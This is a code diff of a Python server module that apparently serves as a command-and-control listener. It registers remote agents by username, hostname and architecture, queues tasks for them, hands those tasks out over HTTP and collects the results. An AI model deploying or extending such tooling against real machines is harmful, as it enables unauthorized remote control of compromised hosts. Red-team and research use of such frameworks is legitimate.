@@ -1,14 +1,27 @@
 from core.utils.config import CONFIG
 from core.agents import commands
+from core.agents.utils import task as taskmng
 from core.utils import common
 from core.transport import tcp, http
 
-from dataclasses import dataclass, asdict
-from flask import request
+from dataclasses import dataclass, field
+from typing import Dict, Any
 
-printer = common.Print_str()
+from werkzeug.datastructures import FileStorage
+from flask import request, abort
 
-AGENTS = {}
+@dataclass
+class RequestData:
+    method: str
+    url: str
+    path: str
+    headers: Dict[str, str]
+    args: Dict[str, str]
+    form: Dict[str, str]
+    json: Any
+    data: bytes
+    remote_addr: str
+    files: Dict[str, bytes] = field(default_factory=dict)
 
 @dataclass
 class Agent:
@@ -23,13 +36,20 @@ class Agent:
     hostname: str = ""
     arch: str = ""
 
+
+printer = common.Print_str()
+
+ALLOWED_PATH = [ r.uri for r in CONFIG.listener.http.routes.values()]
+AGENTS = {}
+
+
 def handle(conn_type, conn=None, addr=None):
     
     match conn_type:
         case "tcp":
             handle_tcp(conn, addr)
         case "http":
-            handle_http(conn)
+            return handle_http(conn)
         case _:
             pass
 
@@ -67,8 +87,8 @@ def handle_http(req):
         if id not in AGENTS:
             break
 
-    _, data = http.recv(req)
-    print("DATA: ", data)
+    _, _, data = http.parse_request(req)
+
     username, hostname, arch = data.split(CONFIG.agent.seperator)
 
 
@@ -84,6 +104,7 @@ def handle_http(req):
 
     AGENTS[id] = agent
     print(f"[+] New http agent connected: {agent}")
+    return http.generate_response()
 
 
 def handle_interact(conn, id):
@@ -109,6 +130,18 @@ def handle_interact(conn, id):
                 continue
 
             match cmd:
+
+                case ["tasks"]:
+                    response = commands.tasks(id)
+                    tcp.send_data(conn, response)
+
+                case ["result"]:
+                    response = commands.result(id)
+                    tcp.send_data(conn, response)
+                    
+                case ["result", arg]:
+                    response = commands.result(id, arg)
+                    tcp.send_data(conn, response)
 
                 case ["cmd"]:
                     response = commands.cmd_help()
@@ -145,10 +178,68 @@ def handle_interact(conn, id):
         return printer.fail(f"Agent {agent.id} is dead")
 
 
+def extract_request() -> RequestData:
+    files = {
+        k: v.read() if isinstance(v, FileStorage) else v
+        for k, v in request.files.items()
+    }
+    
+    return RequestData(
+        method=request.method,
+        url=request.url,
+        path=request.path,
+        headers=dict(request.headers),
+        args=request.args.to_dict(),
+        form=request.form.to_dict(),
+        json=request.get_json(silent=True),
+        data=request.get_data(),
+        remote_addr=request.remote_addr,
+        files=files
+    )
+
+def handle_before_request():
+
+    req = extract_request()
+    if req.path not in ALLOWED_PATH:
+        abort(403, description="Access to this endpoint is forbidden.")
+        
+def handle_auth():
+    req = extract_request()
+    return handle("http",req)
+    
 def handle_task():
-    return "OK", 200
+    req = extract_request()
+    agent_id = req.args.get("id", "")
+    if not agent_id:
+        return http.generate_response(data="None",status=400)
+
+    task = taskmng.get_earliest_task(agent_id)
+    if not task:
+        return http.generate_response(data="None")
+    
+    header = commands.AGENT_COMMANDS.get(task.command, "")
+    if header:
+        header = header["header"]
+
+    return http.generate_response(task.id, task.command, header)
+    
 
 def handle_result():
-    data = request.get_data()
-    print(data)
-    return "OK", 200
+    req = extract_request()
+    
+    agent_id = req.headers.get("X-Agent-Id","")
+    if not agent_id:
+        return http.generate_response(data="None",status=400)
+    
+    header, task_id, result = http.parse_request(req)
+    if not task_id and result:
+        return http.generate_response(data="None",status=400)
+    
+    task = taskmng.get_task_by_id(agent_id, task_id)
+    if not task:
+        return http.generate_response(data="None",status=400)
+
+    if not taskmng.mark_task_done(agent_id, task_id, result):
+        return http.generate_response(data="None",status=400)
+
+    return http.generate_response(data="Done")
